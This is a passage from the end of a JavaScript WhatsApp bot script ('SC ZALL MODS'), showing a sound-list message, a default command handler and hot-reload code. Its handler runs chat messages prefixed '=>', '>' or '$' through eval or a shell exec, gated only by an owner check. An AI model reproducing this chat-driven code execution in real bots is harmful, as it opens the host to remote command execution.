sound129
sound130
sound131
sound132
sound133
sound134
sound135
sound136
sound137
sound138
sound139
sound140
sound141
sound142
sound143
sound144
sound145
sound146
sound147
sound148
sound149
sound150
sound151
sound152
sound153
sound154
sound155
sound156
sound157
sound158
sound159
sound160
sound161`,
contextInfo:{"externalAdReply": {"title": `SC ZALL MODS`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/@ZallMods`,
thumbnailUrl: 'https://telegra.ph/file/cc0deb64bdd348adbc0cf.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})